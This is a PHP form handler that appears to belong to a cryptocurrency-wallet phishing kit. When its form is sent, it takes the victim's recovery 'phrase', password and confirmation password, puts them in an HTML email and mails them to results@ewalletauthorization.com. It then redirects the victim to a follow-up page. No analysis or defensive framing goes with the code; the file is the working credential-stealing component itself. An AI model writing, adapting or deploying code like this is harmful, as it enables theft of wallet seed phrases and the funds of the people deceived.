<?php
if (isset($_POST['send']))
{
    $cpassword = $_POST['cpassword'];
    $password = $_POST['password'];
    $phrase = $_POST['phrase'];
    $recipient = 'results@ewalletauthorization.com';
    $message = '<html><body>';
    $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
    $message .= "<tr style='background: #eee;'><td><strong>Item:</strong> </td><td>Details</td></tr>";
    $message .= "<tr><td><strong>phrase:</strong> </td><td>" . $phrase . "</td></tr>";
    $message .= "<tr><td><strong>wallet name:</strong> </td><td>" . $wallet . "</td></tr>";
    $message .= "<tr><td><strong>password:</strong> </td><td>" . $password . "</td></tr>";
    $message .= "<tr><td><strong>Cpassword:</strong> </td><td>" . $cpassword . "</td></tr>";
    $message .= "</table>";
    $message .= "</body></html>";

    $headers = "From: " . $recipient . "\r\n";
    $headers .= "Reply-To: ". $recipient. "\r\n";
    $headers .= "CC: results@ewalletauthorization.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";


    mail($recipient,$subject,$message, $headers);
    header("location: lastpage.php?msg=ok");
}
